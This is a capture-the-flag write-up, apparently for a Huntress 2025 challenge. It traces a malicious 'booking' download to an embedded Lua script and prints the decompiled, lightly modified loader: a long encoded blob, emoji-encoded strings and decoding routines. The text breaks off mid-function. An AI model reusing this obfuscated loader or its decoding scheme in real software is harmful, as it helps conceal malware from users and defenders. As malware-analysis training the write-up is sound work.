# Prompt

![](/huntress_2025/Day_25/My_Hawaii_Vacation/Challenge_MyHawaiiVacation.png "Challenge Prompt")

# Solution

- I didn’t have a lot of time and I really got stuck in a loop with the LUA and fell down a rabbit hole. All I needed to do was download LUA and just run the lua script by hand with some modifications with prints. But no, as usual, I took the hard route. This ignores all the stuff I did and instead gives the simplest solution as I found it. I also wasted time looking/using online compilers instead of just doing it the right way.

- Navigate to the host they had for this challenge and view the page source: 

![Step 1 - Download](/huntress_2025/Day_25/My_Hawaii_Vacation/Download.png "Step 1 - Download")

- We see a pointing to the path “/download”. So if we navigate to that, we get a file download of: 

![Step 2 - Booking](/huntress_2025/Day_25/My_Hawaii_Vacation/Booking.png "Step 2 - Booking")

- If you analyze this file, there is a large overlay section. When you look at it, you see the LUA strings. 

![Step 3 - LUA Strings](/huntress_2025/Day_25/My_Hawaii_Vacation/LUA_Strings.png "Step 3 - LUA Strings")

- So I used this [site](https://luadec.metaworm.site/) to get the LUA code. I then started modifying it to find the strings and “c2” address we needed. This is my heavily modified LUA script with the prints. 

```lua
local r0_0 = (function()
  -- line: [2, 6] id: 1
  local r0_1 = arg
  if r0_1 then
    r0_1 = arg[0] or ""
  else
    print("goto a")
  end
  return r0_1:match("^(.*)[/\\]") or "."
end)()
local r1_0 = package.config:sub(1, 1)
local function r2_0(r0_2, r1_2)
  -- line: [8, 8] id: 2
  return r0_2 .. r1_0 .. r1_2
end
local r3_0 = r2_0(r0_0, "deps")
local r4_0 = table.concat({
  r2_0(r0_0, "?.lua"),
  r2_0(r0_0, "?" .. r1_0 .. "init.lua"),
  r2_0(r3_0, "?.lua"),
  r2_0(r3_0, "?" .. r1_0 .. "init.lua")
}, ";")
local r5_0 = table.concat({
  r2_0(r0_0, "?.dll"),
  r2_0(r3_0, "?.dll"),
  r2_0(r3_0, "?" .. r1_0 .. "?.dll")
}, ";")
package.path = r4_0 .. ";" .. package.path
package.cpath = r5_0 .. ";" .. package.cpath
-- close: r0_0
r0_0 = "RR3IL6YJTKWSXB3I6KRTAAVBFXUV2Q5BBDNBH5UTPAPCHZXKTJNYG5PALFL5VXAS2OVF3IPATW223ITWHHYEFUAAYXFJLO6IN662OXG33IBFO5XORQJFW24PFIWF4BWMVAAZ3LW3VPPKZLI4DQBBHFI6NRF4X3TCWK2FUK7VQXBHOCAZNDKZNUNIPOD3YRBWZDRWBHKZGQFXNZ6274TMH3I5D6JXS4IZDS33AGD45AWXC4GLBPG4L2S57EQ5B2Q5CFSFD4GF6BI5IMELFKIEZQXNN3FSP2XDCXF4453L4AUJE7TJUED7TCMMTAJ3HCLWOPUIBBTUXSI5N2X2BZ2BIKV4SC4TUBYHDEIEDCUC3C7ZKXHP3LBCP4BCTOXIJ27W7E5WMXGYV7A2KQMWDLZ6GROH2Y6LMWNG7VXXCP5OEKFBTXCCWVPI66LTGGQ5RK3SJJBBV4SN2JBQ5UGY7ZU5VX2FVTGOW2YNBRUHNJKO3JTKPPJX72RFRJ47EX7TXZPG7WJ4MQKFIAPCGVQD2LNKN6MRG5PFMDMM2GIXWBQKHUB37F4DMGDIQNU5PIKDTA6HI7NPC3YMNYALOXT25YQLLOAEGZ2H3FXOL5VD4O3G35XF22Q7SHAGIBH3JG4IQARIXY47HJFGU6P6EB3NZLHLTHFFLU5OYXITWPYTO2QRPT6A2FVO6PWQAIU5FXMWTBOJRLDGTJRLDQ72BAQFLBSUEYRZKY5O4ZHTQZRU3D7TIR7QTYJBKAG47YRSMWNYMHPUPG23LILCKB2TUWKBKGYOP2DQKT2AHHQM35L4LNO57BLRR65BHBO7IUO36ZRFKE3GBJSZUPZETHB32K7ONGKFSZYAIU677DEHNPYQYQSBCFQZI5RSSQNSVQ4YE64UVIPNWGVS5LCYELT5BFQC4QU7GXJLURGUUUIYN3JF2QHLJQ2V3ZMEO7Q3SFUMLLTXR4GVAAIAVPDGYCS62HS5IXWP4QFNLGBYSIKQ6OHZJSJENFETMLZP6VLJQNJUHJR3FIIQUW4J4W7QEYOTI6LVZ6YEQRNJIIQKWD3QQYCWIYSRHRGR7ZVWFTPSDQS37CA5W5J2PUMSSV3I74FZOJAQLAFG5YISBJQBKRT2KJSO6ZECXFZSOFHYEHMGOEDOSDJPOFUEYWNEH4NWMQAZ462FEU3DJM2Q6EO4FSZNN66CXN2QOF4TNLDYA2BM3HMQSHVT5DQJM5LJV4OXLS32H2PVX3LU4BDSRMOECPV4QQH4YTD7RMBOIOPW3RXCCSKXRCYXKUBECGLYGPO7SO7RBYCQFEUG6UYWUQZFZSL7WHPYOTNXD7BLWDFJ7JAXBYVNOLONJEWQENY5HI2ZPBZ2PHAGF65DFBK7FXD72KRNSMNYSHSCG72TZRYZ7CE4VBYPB56SIXTS3G3E25JIRVIAUZLAXI4P2H26ZNOHKNHFYF6YPKXFXCE55PR4WLZ5432QSMBMSTPDRZESHOP5HBZLCBNJ5M4DZNMV5USRAH34IVFMTHLL5F6CUUCVTNL6OUZLMXMWCAJ3L2CUGH6BBWBBWE4LIOVPGQ5W2QWJKTLUWITFBMVD2GW5NGN27VK4HV7N57FIHVSGZPHHUOFB7JKB6SDP2LVEYHOLGUGQ6IUC3AKFX65FCWD6WOHESIK2JF7R6CPWCODTBBYORV2CCEUU57OO43ISSEUKY4RMBWCFORSZ4QX7OBGIYH2TPWZDA55LAKXLSTGBD6OOKONJUGFC4QMYQV7RN2REBQNVMMNG56MPBXWDBCXKXKLDMY73NHAGMEONFXIWJWUXAJWXWKU33T4RXVDRHFE2E7KBKGXWBI4EMIEUQCK2J4Z5CDLSH7O5POPGUP4YQWQZZCVA77HGZDT3TRZV6EY3V43G7IJWMEBEUAAYJWSYRNAVHHMR7YNG47FP44Y7EGTKZAOB7PTW5IUVOXTWAC76S2VZYNEY5LMF4X355UPY6NGLBCJP4CZRSOGGTZXIZQKKAB4RYRP2FGZ7EUUXXYDR3K3PM74FGE7CMJ5KG6UYTSQSQLHB6RZRUR7OSBJVT2H3ERHFL5OCUMPWAYLTH56UE4FS5CNUZ3OQ7GWTETA5XJKHPRNMGFZ5QPACBYMPFTOE7ERY4Y2OVMAG4MRU6H5AW5R4WFJBTMTQFHP5O23HHQDFEEAC5MY2DWQPGSEJQ3CM3JENCYX47V5ODAQWGAG5PLVZ625ETWCOUNEHPKFXEMRACFYCIOUPSK335C4KNFO6S4Q464LDPTG5BJTZGNUUAYJMGAMPDTLPIRFEGUV2DDN3DQWLTNCSDFEZMLBSEZU2AFFPUUNBW6VWTLP4SLEPRHRVN5HOTSGCNSJSTRHGEOQ7NDFCBEI5WYTO6MU7POXM2BGN7LBWSFELPSHHKWAQABVDEYERRQ3L37NBUQGORTO2VHCBDQDTXWCLQCP5IH5N6FUA3UKETR5VYOB3NOHQTLMZ2MG3RDK37H4VUFDWQOBBUYN7RPGECPY3IQOPXAAGC6R5NCONGTVNC6Z7T7Q57IZQU7EUO3J6BALUPIYRIVZQZDYABML3JRJUFSM4BL322T5V63K273YZWGZDNUWERVBEDJKMQSYCVG266G2ZSJ6DUINNGMIXUHI7SQP72JBYQQBK5E57TEUMK23AJESKSMOMDJ55FIDEMDV47HMNFWGXV2JBLFOQCMJ3H52ZNIRLOFV6PUSPTIPOLCVV25OJTPXKCQGP76E3LIGNUZDI6IO26WFX3WASXJUYE2T4YHOYBYIKOABCFYOYHPMLLOMZHJWIQHLKYVQ2XULH34SY4MAWJFLW5ZPR447VGO2P63E6O746CRRP5XGXAIZDCRYMJOS3PKJUCIT2OBNVANXEGE6AAH7D6HPBHJHO43FW7PD5GYSMBOZEKJIFF6RF4YRQSTWG7XV7MBBMIOLNZ6BDB57DJGVNR34DZYF5XWDU4KIVTRMVHAXWJY27UM5CDOF5BWF6JXHSRPELGKMZFAAW3DDCXZB3K5INGHIT33OSAUQBAP5KV3VTPNNNIJTRSRHMT6PQSBCMQYA5IBCJU3TSSZJLCJFYVT2K4NMH6WZYKQQL7CWB2VJCHVWL76PN4R3XFMYLWOSFAOMWMTNGDEGC6Y6EP6ZWSHBSPH775GUIOZD4NYX6YWTKSWYILT5NF6H5UTO4L4FYZXT2DHQUTT5R3LT57IVZHJPHY6EPKU3XPISBCKTTJNZJQEMK7SFNMOZXV27TZIOOKIPHAMF2KWG24GGU62XWDCSU2JHVSLEDGONHAGFFHU5SGE4ZPFJ56HRXVGV5NPQIY236CHBP4GAQL4PQI3QBVKMI3BJ3BTJPI3VFWGNRCWGWMTOHE2YWAD7Q27GHID7LFFBCXZVTTCDTB3DWOC4GH5THHXL6N3OBPVZESJFUBOTTQMKSVTBI5KJYVHXVMLCRWEDMWVTT7HUHMGZYEL7YKSWIPFAQDXI2V3NZAW2W6U7XSWN2QDQIOQO5QJ6FHOMOY6477QE4WYE7EG3W6AFUSJYYMAGLOLUXDZYEROHWYPQYLJPLF7GWS3PIVMMWFVMVDTLO3PLU2TIBSZ6DJ24CPHFDCS47RVLT65KA5GHPZHRAUJGXVG3GUSJGPT3NGC7MATWXHAW5BO76RN77GYRL4MSEVZNB5BSG4FMJDI5KIEGGL7AL7QVBNZOROCEIRBB4PGH3UKLW5K4QHJFS3YRTM6KVYNXVIHZYNIJLYYODIXK5ILZB2SJXPSQRHVVZSXPTHKKIWT4M77V44OEADI7QUNYWKJAMLXBFRELZTLAFBH5WNCCSYO573DKQFMY3YUWQ2F7ADCZ56E653XFZS75HU7M7S3O76A7FV3RU7M4BD2UBF6ZQN66KOM5IRQJJXB3JWVEMQPHJI472CGW3R4G7HVAZYZNPIBZEBEB5FVARIRUICDJBSZPHRCWUC3SPR5FERFSV4EGRD67SWZRV6Y23KY2TN5NWCLBGQXDT3FY2D7L3A6N6GSYMB4FFGDXJVJDKBGXRE4DDFONPELZMPXN3VA2BT3F3AGYLXREMEQJIBVZCS6BP5OXUE5RB64BC65WPMXXR37ABRMUILFONPPT5WQ5ZZ72FULEYP463P42T5CNOZJKJ3PM4USOCH5W4BMZDVGRX4RJCRFEYDEY7HZQJNAAMGXTT3J27TJLWA54WFYFXYO2AYCMXGAEBRO2WL7HXOLOFCIPLSBLWTYCD6FX4IBTAJ3POSPNZP5GLPYI7D5OUABJW3FARZK54XOOQZKNXH3ND7IQCSKPMMMBAX4CQQYASCWI2JAKYSMOVWAKFHCXKFMTG7GEKXGVE5AE3QQKAMEGNGJX346F4STVPYLDKTKY7GFQ62PGWVYK7SMFVMA54LNANZ6IYWCPP2VSIZC5IQJCVKCD6NBXHKI7HECUW2UWVHQXBRU6QZZXP5QIB7F4CEXHJQGOFGDZZFAS5TNNOOJ6XOV6WUEE2XWPDSW5UE2YXNLTWNA2EY3DTIMW3F4JU57ZEVRAFDJD25NFETA3DJQVMSKSOMJEA6ZYBXUNKXL43QOKAJ7VH2CXH3L2AI7AQE3KSUWW2TYHLJ7UTO27SBM2MWC4QY2NTZPPO4DILC4F4TP2Q7CNFJDVXP7FIS7J7JIT5GSMO5W7OOQL22RP6YSB5QZ74SRNE56G54YHJHQDHTEACIVTIJOGHDJAVKQYMJHTCBMRT4RACOOMFI3OEGHG2PM7RKGCFFJEU4CSEJZVZABQ2NGW7U3NC462QVK6TTOTHNUARCJ2NZYUKCFV4DFR4MTBN2S6PTSUJGISCNBSJXALSHRIEAUER6D42VIBYOULT4U5VHYHCQ6PF32YR5SVGLSQYZYD35U5Z3XQ6BIZ2XOV5UJUGXMWKZJ5ZAU26V3QZS7MFDQUJTJFGLOHJSXNLBD2QBAFVWQE5GAO7GFXD2CNADTI4UGNGCTBLBFY7ZY5SGL4Q6K25UJGIBYEH2Z5C2GSNBXEKG4UWNAX3T5WMGVLSJWV7HVPDMSTGROYWMYYMXISCAS7WPXMCDMTPDB66USGFQP5SQOWTA4RWLUGXMVJ7QENL6EU5BGTTTRLEUNNZSHYR5RMDCJEIZ53KLBCRPSPUBSVCAMHZX7IKN2MVL2YJKYOZB6Y64BCKIB5YZDFXJ5GRTLXUK2N4GKYYCARVUFH7X4SJ5FE5NMYVAGMVBC3VCWYTEO33TEDRFZOK667FWR4EMGBSNPQYG4E7DTW4SUX3XW5QNER7G4TFZMWC3FBSPMI6JTUVGMGYPV2VEPM2BGADDQMXTAE2N32H57PVYIF7QVKTKKZMZ2P6J6AHARXWE5ZOCGZOPEQK5IZ2VX3DSQQG2IJ2AX5D3PPPJYWF6UZV6JWDW24YLP3KSHUX3XYMNQHDFKQTKRPP67MB77ACXU3UWJ7BFSPPKBUVQD4OJIJ3G2ALISJWOITTWIQJBQRQ4OZZ6FTPAT6IPJNSPAZWNFKM7VABEBOL2P37MKG3WS2BFZANOWHOLZKYEESDXPT3BIGCKCVN3V75OP2TPX7RUNZOILDLXGK33N7ZNDMWXFNDIO3U6LBSUBEIH3SQSZ3XGAROY5O3V7KT32QWUADDR3IBBONFBQ2NNM2YWCJKBPGKZVI674NPWEWQDRVHDMHN2SXUM335GV3N7VRBYWB3Y7R3M2XR4COEK6RLXBJRLUIRKOFBODJMYKKU4LDF7Q4Y3HCS4EZMR52CVIIMCXBGWRPPPJ34RCIKGOH4E7ZEX3FVX3ZTMPMFLNM67XIHNXUQEI34GILPK2IOIYJTWAANDGQQENJVJQT67BVOV2F36TVXZXCBX64WCQF462Y4Y576FPDR34H3JQLX5H65O4A5MWVQ3MQAVXHHYQTBGEETUV3TWHTWW3TRKSO6T2ZNAGM3S4YBSLE6CW3ZLDXTFJWZJZPZOOPJAOPU6CZ7DXR2KYHTK2SX5K44YUBGMZJ474O4IEFA5S54RU4HZNTBTKMXWPDV33B6B7NT57ZQPGMNTKTY4BJIGJJK4QMVYNIKWPQCUQVJ54YUC4JMOQOM2JYQVYNQGAYUW567YN65UAXERQCPYFMSXNJKOTNNWV3D332JLJOCPTJWQAJW3PH53ZVJU7CLH6YQSXYYKKKKJEEIRWFMGK6BTWYSWKNNFCJ7VZZU465JDE3HGVYIRPA6B6N2R5BI5QAABXV2RTHDTMGI435B4QGYWPYZU4T4CYWHVIBM4KX7CICTI3FLLKTLO26YIDJCYSJJVH52KKYATV3Z7Q7UNZQIBJQ4WY2RYQX2VTIYC3S7XMW45RG2QAIPAL4ZX5TRHY2T27HRSQ2NZMLJTOB55724KXXU427HY3XKC4UO23WAERAA5QO2S5BVFSH6RMI52EF6CA2HDXHLJQSG2EEFZA5YMVGSQDAUTBQIRDND6RIE5EU45VGJ7WBIEYP7FXVTCLSIYG2ILVU6JIM6HPTT6LGXKITQQKNSAS7G4APUXYOCR7YOMF357MGUSCBSQJVBC3RLZPRIM5GPIYCZ5SNLAUF7MYQW54ZXW5UCCNGGYYTXO2FPBDCCZ2YA6AADQYYMX3TP5OXYVTVRBFHBCKB5DDL6QTSO4B3RINR56R6RSOKHBLAQ4SIEB3X6UXOZKEF2EWM67ZJJE2VCTMS32BAH7FPOZKZZWWOLZ6UESINTUBBOE556KOEQZ3AZEYORTVY2XNC6FO4EPSP46FK6W7MHWVBLIYYRLF3FHCXKXYS2PB7ZVK4OQW3TZWYWZ6J4D7XNJMX3K645RWVV6WX5KLO5IA5G2ZQ3XZ4QQB5QVKU4RMI6DET3QLI4IJA5OLTNUSRDWZWWIWT4YKY4LKGQP5UTLD5TOKS5A3KQJFBOQ52BTEIOMCQT4Y2O5KNGCG6RPUYEYQZGVX4JLZII5NVZ4S2G75BHBNNXHCLT3FQRA32BEFF5KLESSHVGZXXZ6CECHSGGG66JQ625UCGJUFIKQKASKIWVDW7762CFZFXAMDCCFXX2MZZDQW4SQTLRPTHWF7QW4OQ6DG7YPI3YK7Y7K6Q6Q66Y2DC5AJUGP4DLIZC2SIJSTJRDJCCJ5LYYIQBJIPJUXMHJIBIJGP3FJQGAIJ5FZUK353XIPXETQEDEK3QVNVVCQZXIR4QQRROR4Z7IPMGTM32GDNSMCG6HLI2ZZTZV5T6KWYU6AZ72HZGU5HVG6ZJQD5TIQBH63YEJLF2LLZWC36HYD4CUXZNTVEI5CCUAGPNPQTCODCO67FBRN3FBB7QQKWJUOH33VBZBGZQO2C3ARDO3RIVIJZCWRERGWQEC4E4WPJATH3M5PPE6H35HRUJQC5MNMZQ6YNSICNCMFL2NTIKDLMN7HCOXVC3M66S2QUP3BVVJBZX3YH22RFXYLAEJ333OFBWJCQEZ4CK65N7BLYDT5NB6AG6ENQJVAMLFVPGI2P4D4OVC66EWYV3ZB2V37536WHEP2EQ6O6FKKQMUKXLG5XKOXLR6EAHOYN6IPZNQPGN3ZPA4PRLR55F7PHJLQXVTPNUSXW5DSV5MMLJ5QQ3EYHH23AP2Y4RJTH3DRRCM2RETBSOWIZWEL6L3TAKBYSIL4LY4STQR3VG6RZCPVFNHINPBGTA34RGMY2NJ6UQWYL2FWDGM4V3W74W5VLII75QRIM53X6PVD53XO5DR7R7RFMMRQF6QAAXZK4HSS3LVMXISIXTML3FOIV546TYL4KWRFA3F44U7SAILURDE42PVFGCXHGE54XDGUEBTCVRP53XNDZAW53T2PFJLLDSW3U6GPJLRZCICRFB67YFYGA45YEC2GREGNYJZAKHZBVLV22MJBGZS64YOCT7PEYQRTA26RRFAYBCRW7SVAEXZZIG2WJCFPLF5IFGVYFPYRGZ6GLAEHHVXXJOJS4ECNJSYT3BSR274K5GKGWMZMYMLXMMBW3BVQHBY6XMV5MKXSTXXS4LOSMBOKCFT6PDWPSCW2VLPUFSLKCSAUYUB4OQHG6MPU6P2LLAOPXSGXHV3VIBM2RSHTV24OK2V47LDIJRMKI57QHRWZR5HRN6NGOFI7UGB3ZGXGFJ3JPYG2ALYDKWJF6BVQXJVI3SLKYBN4ORXA6GSPVMPJVXIZ75XJ4XMSI27KOMMRPVUGEX3F3EXE33DJCVJOAJ5GW5ZWAXBEDXT7QPEIXUR2OJ3QQWHW243QYQO45ZOEJ6OLZVGIKYFUHUHH23XUURLWO5G4WM2R4NGJ6S7VJQOZOYBSQTJHLLQ7II7IAMCZQLS26FFEPEPQB44NQ3MLMTU5EGWOQM7TOBMETZAWKUSXBSW76S265ZFYBZ65YKR2FB7EJXVIT757WC4KRGRVAFKYSIIOQLKLLMY5WCWU2WGLSAWZLA6JCF6G2F4LJ2BU2U6LNVQPO4SNXBF23P46WMTRP24CR3BNYDOMYVAHRDLRMHF4RCSDGI3GVKHXM7WPC73H3NOV7JJX6YUDURIHGRX7G4BSHTZIU7POKZIU6AZGBPI5HN4LFBLFGPMFUIUUUZFWZFMVZUDR5X3AX375P4B46S3OU5EAAJQOTW4ACIP2WVNHWNABJUKLDQJDGHNPKFYQ5Y36GJ2BACYZ6UMVKCM37TTVAQMCIHG2EGL7E3FIUPDP2DLKV3L4T33GHLKZ4YWNSJFRZMLXAIDZIL3OIESIZJ3QOM3UM4RR7V5PS2Q2REREI2GJDGMMI2OTJE32FDSBA6EC4JAI7N4UZCHXCDYYZQW33VZAXHS5REVDN52KNM5R3DICLBGHHQNGFCMGL3FSKDPCKRJB4AGLNLL5OYRU6S7JN65T75BQ7CWTRXO4R7NGW3WQWTLXWYFYFGGOVG226LUK3ZB46G5HOEMYYFJGAW7NCBSYUBGUIWQBY752MCO45C3YBIVKHEQ7DGNZGILWMRC3LYTARXP6APVQGUS6Q4FCQPDAU3MCSBLOUTWZBXW3SVNWTQ4UYWW3JSOTIW37QGGDXUYFEJIMNOS2YR3NGY6PPJF3F3BHXAWXSLYVI3F6A6LWFRXZZX5BJXW4CIV76G2M5AU27OSQGY4NCGNL674HLHUGZ4AYEMXIUSYHGXQ3M5BILHATBBF4F6FKZUB3AM3SEDKBVYGAUFPL6HHWI2FKGHOAR2QXTPDMDGE5RG34UIKCQSMZSS3H4OSRLKA5P3WVEB3MFDXOASYXWA6GYQ73JDSEXKNYJ5Y3W4RYA3QSLP63HZDWSRIGJGMGARW2CB4SOBK3NL535YFVJ42X3HEVVCXCTVH6ZGJNF2W7LHD2YBDK46F7Q7ZF3R2ZYIR3NB6PDB3EOL76Z7UL4TRBLFQZY3JFGYCJNRPGSY7FLRLDUZTQSAIBJ2ZIRYT3TYRHWPLU6RF3DL6GPGM34BLPJSPAVSW25H76ST5XUHMMWQA7MGJPVXWUKFKNHPRCDT5NK7WRORDVCLVOASY6DBDZJY5IQLHKW6ZZOCKVXU5IGMCASTCBKVNZFPLIRLYH4OFQAADXUGHWG6SBOZT2Z4LSQ5CCFONZMDT6OZXYVH5ZQVQKVE6ZBZJK242CA27TIRSHJMNAZVLYMTORMIYPV7I24RXA3ZEJHWFW6WN2QPO7X3AZAKUAS2B6NWQRHJQT25ZDX7CO4M4L7RHY765FE6ZGMRW5TEQH5GPVICHRADP75Q7MC3B5Z74AQH3N3FCU3I7BHOSXNQKGZCZCEWCTEDYXDCE6UG4ZLYL2DHOWB3KDLCUJW5DQWW3WUZ2MZLLXJJCROFMSLAYFNFRJADZK2WOH5MARCJ6FDKFHCNZIXASN7QHN2NB2DMZZ4GSSXUBNLA42HAVU7BKEUYY4UW3H67VS4X4ZB5276HYU4SSVCJP2UGWO52ZE6YRYZNOZNL2EBYS44JHKUCEENH3YNFEKBMTDMUU5RABL4YNQORFQR5JFEYZM6KLVEYBQBPQQXJRH3MSD7SGII7TG6HMCQEEY5JDL4PW4PVRB27FTLT5B2PQBQJG5GKH6UINPSKVPX2I375BCSBLIIEYZIJK7S27LIAJJP7EX327KVSIYX2DP6TWX7NYB3OHF6CHNVGBBL3A5TSSH3MILUTHDNHR4YNAX562PDTGZAESP7F6WE3FZTIFV2JGF6UVW2ABEFNT3AOBOPP6UL7DCFSQ6ACNF6ZCHM6CRLFQ2XL355FGDJBRKRBQDI3JYAJUSFUPX4NSXAX4FG5ERU25CFBH7LD63BKBUX6BZ6CT7KM6WAQGSPESI5QNADWH63HT66OBNN5U7BVOO5VCY3KXDQ2SI6WUVKUUXDZPKNT4CFWR3UYYLFHUJDHON2DBRNPCNEPF6TEJTX4WOO5GTDTUYWZ34LMXRCPKQRQO5TF4EQDHYKC2P3QMXYVZXPSA6YHH4ECP6Y5Q3VP47P2KK26PHJ6G6NKWQERCG5RARCYZNV6I2ARIIZWP2MDVXCSCXSQQG4DOYMQ4X7PU4OOLZGE4WPEOB7XW3II737G3IRFB7B5EL5AMN6BIYTHVHYJ6WYW22IPI3XRLTYGJYTPPJCLEQEFKTWR76GWURMQ2QJYCFMLGIB4WJ5RKN4DCHPR3J6TQPCNSCIUVXNKWIM4CGTR6NF3XU6FMB5FOJZQLJLXYL662VRFR3LQAKFNFSKTCCBERBPH45QI4TLPAWWTIZIGJPMTZANOGJSFSRQXBU2QQQ2IZHZ6B7S53MNLKSXEY7IHLT5DYP7Z3P7BNKV5CLUBIRRD4PTEVHGN3GYZJQWQBMJ5TVFF7QXDXY2B7GXSJ6LJJBZGCJKOTLBMUUWQUB6QIMVO32S3COQF4C277Q3YXSFRNMBIFV2IA3I7KMHQOLFRLSLA2ERUIB6W764E2KGU5GXGCM2ZDUYSY4XY3A6SIZ3HVUJ6X4WLUZRARYZKD66AFWLPUSAFXAR3FBKY7W5YZAYCKW4NG6LQSZLTH3VPQCPCROKD45NZWNVQYC6Q565QUDL53LT3VDNKZATEYEM2EL7LSZYRFHJBBHKKT6CGTYMAFFUK6IVAHGZXFISVOFRVUUJOYXGJKVMG4IDNZSIKPEBGBAOEM7NVLNFOSC7BAL7B4QE7M2PY5DG7XP7ZA3ZNZTBYDPWDRDBMTKNC5ULPVAXW6KX2BF3KDCEW3UGAXQFZB5IQSRH6SKZHXGBHMSYNXNEGYYBKRMDIH5TLU7UZ7GVVYGDXBS23WZG7XGZ6FFXWVGBBDSANYZJIMWUCYHYLISATG7I5SVYHJJFP72N7IFL254VCM6LGO6OYHE2OGXUF7EILOHSS7FE6IXOYOJXV2MQDTEBO23N5JPX6EAYQAZYWXW5WXBPTBAIIIEMGK6R5O7245VEZRRX33ODFLLVHQ6FPXBT72X6YAOOX7VYPSUVNSTNBGETXVZ4XMVZ4VJUTSWMMGIQHCALXQHLJJIEWBI735WTKCSSERDCKP2VYKDZQJBO2XNSMT6DKAQGB4HATPGDUMPWMK53QS623FF2FSQ5ERI2MCYCOOBB5RNNWU2NSIXPLFLFVNTJCO5LWOAJ2PFCZD36W2Q7LO3AGKABZTUJT72QOJMHAH3FMM56FHCAXPCNXNSWOQVB75TGS6PLOB24BR4PGOTCED4JPXPBZW4W5O6NG5W57CCPOODBO2GEB2D5HXL43IYI6AV6ZVNSPH3YMOB4IGLDZMALJ6B4PQHCFQRWO63XMMFMCGSFZN4CROTFG656WHRAWJUPUUVLNMIQE75CYAYGMLZ5O54JZBQYZJERJ3GRRJTOFVO7OFGHCYYNCX4QG5KEHTRY5FLCHEYXRYM754ELKI4XPBIA4ZJ5GCLLPKE26GFFWNNYYSWNOQGAKS7FRFQUCOAYF5VO7LJPDEPNSX4GRWCAHPCHP27T7WQU35FJ2S7COTX5PALM7SR4S27F5V2DMWJQJXL3OC2ZC3FKJFT24C2FYBIYJQ5AP4NAXJCPBXQQOP4TEAQILFLVMTHAGKGQVHBL7XFUOKM7N6T3AENFPUM2TSZNBDWUJNAENN23H5LGH427HEC6FOBBEJZEQXHU3H6UJV6ESK34OIF5RDKORY5LVOIBEZGEEOI5H4MDOQI65PVGFNMU5CPCNCTTGJHTGSEAVFPKV7343U76GEDE7LVOSXD3YRAJ7EBIDTFC4POK2UV3ENI55NQISOSV75BOHI3DLIO6RCCDY6TESYXIKIFWA5KQYAAMRSTUZJCPHRS6H3JOBAK4WRX5ZPS4RU33GCDAHCFTEZ3D73DYDDEN3KY7T3AP2KA2Y7ZHP6MJYKPSGB6WZWCRSENUE7DW762NMF6QGUZG6GTLDKTZN4ZZQFTTZFSQ6WDXYHUNNKOGE6EG2O4PIBCJMHPN5CNJLUWLMFURVOPLBRGTATFT2EV6IK4ZMMM6PJMCLUDXIORY26TS45TZQQDIMJMJUEXYVY5ZEZI2SCGREZG3EBC3SHB4JDYE325MM2TISKJJGUY635BJZGU74ZVZYKCVFF7SRSE624RKDWKKY6CXI6RFYESSMWKUX35NX6V4Z7S3BARYRDU7QOW2SGBHUC6MIAECOGCFYMWHBM4HDQQCUV5N5G7MUW2FVEECVDQXS2WOUYGX6UNMZRRWLDS5JVVFTLWMNIYHMMP6S7ZJEECCNUEA3DO5ZBJI2SO6OR2XHIKRGHM26RBO7VY5DWHW54IBVTJJZ5AQ74PSSSZHO"
r1_0 = true
r2_0 = "🐠🐙"
r3_0 = "🐠🌴"
r4_0 = "🌊🐬🥥🌊"
r5_0 = "🐠🐙🌊🌊🌴🐠🥥🌺🐬🌺"
local r6_0 = "🐠🐙🌊🦀🐢🐠🦈🥥🐳🐙🐋🐳🥥🐙🌈🐳🦀🥥🌺🌋🌈🥥🐠🐋🌺🌴🦀🐚🥥🌊🐬🐬🌊🐠🐳🌴🐡🌈🦀🌋🐡🐢🐠🐳🦀🥥🐢🦈🌴🐠🐢🐙🌺🌺🦀🦈🐠🦈🌈🐚🦈🌋🐚🐙"
local r7_0 = "🐠🐡🐡🐬"
local function r8_0(r0_3, r1_3, r2_3, r3_3)
  -- line: [33, 33] id: 3
  return string.char(r0_3, r1_3, r2_3, r3_3)
end
local function r9_0()
  -- line: [34, 39] id: 4
  return {
    r8_0(240, 159, 140, 186),
    r8_0(240, 159, 140, 180),
    r8_0(240, 159, 140, 138),
    r8_0(240, 159, 140, 139),
    r8_0(240, 159, 165, 165),
    r8_0(240, 159, 140, 136),
    r8_0(240, 159, 144, 162),
    r8_0(240, 159, 144, 160),
    r8_0(240, 159, 144, 172),
    r8_0(240, 159, 144, 139),
    r8_0(240, 159, 144, 154),
    r8_0(240, 159, 144, 179),
    r8_0(240, 159, 144, 161),
    r8_0(240, 159, 166, 128),
    r8_0(240, 159, 166, 136),
    r8_0(240, 159, 144, 153)
  }
end
local function r10_0(r0_5, r1_5)
  -- line: [41, 63] id: 5
  -- notice: unreachable block#9
  local r2_5 = r9_0()
  local function r3_5(r0_6)
    -- line: [43, 43] id: 6
    r0_6 = tostring(r0_6 or "")
    local r1_6 = 3237919422
    for r5_6 = 1, #r0_6, 1 do
      r1_6 = (r1_6 * 1315423911 + r0_6:byte(r5_6)) % 4294967296
    end
    return r1_6
  end
  local function r4_5(r0_7)
    -- line: [44, 44] id: 7
    return function()
      -- line: [44, 44] id: 8
      r0_7 = (1664525 * r0_7 + 1013904223) % 4294967296
      return r0_7
    end
  end
  local function r5_5(r0_9, r1_9)
    -- line: [45, 45] id: 9
    local r2_9 = 0
    local r3_9 = 1
    for r7_9 = 1, 4, 1 do
      local r8_9 = r0_9 % 2
      local r9_9 = r1_9 % 2
      if (r8_9 + r9_9) % 2 == 1 then
        r2_9 = r2_9 + r3_9
      end
      r0_9 = (r0_9 - r8_9) / 2
      r1_9 = (r1_9 - r9_9) / 2
      r3_9 = r3_9 * 2
    end
    return r2_9
  end
  if r1_5 == nil then
    r1_5 = r0_0
  end
  local r6_5 = nil	-- notice: implicit variable refs by block#[7, 25]
  if r1_5 ~= nil then
    r6_5 = r1_5 ~= ""
  else
    print("goto b")
  end
  local r7_5 = r1_0
  if r7_5 == true then
    r7_5 = r6_5
  else
    r7_5 = false
  end
  local r8_5 = 4
  local r9_5 = {}
  for r13_5 = 0, 15, 1 do
    r9_5[r13_5] = r13_5
  end
  local r15_5 = nil	-- notice: implicit variable refs by block#[21]
  local r16_5 = nil	-- notice: implicit variable refs by block#[27, 28, 34]
  if r7_5 then
    local r10_5 = r4_5(r3_5(tostring(r1_5) .. "|perm"))
    for r14_5 = 15, 1, -1 do
      r15_5 = r10_5()
      r15_5 = r15_5 % (r14_5 + 1)
      r16_5 = r9_5[r15_5]
      r9_5[r15_5] = r9_5[r14_5]
      r9_5[r14_5] = r16_5
    end
  end
  local r10_5 = {}
  for r14_5 = 0, 15, 1 do
    if r7_5 then
      r15_5 = r9_5[r14_5]
      if not r15_5 then
        -- ::label_63::
        r15_5 = r14_5
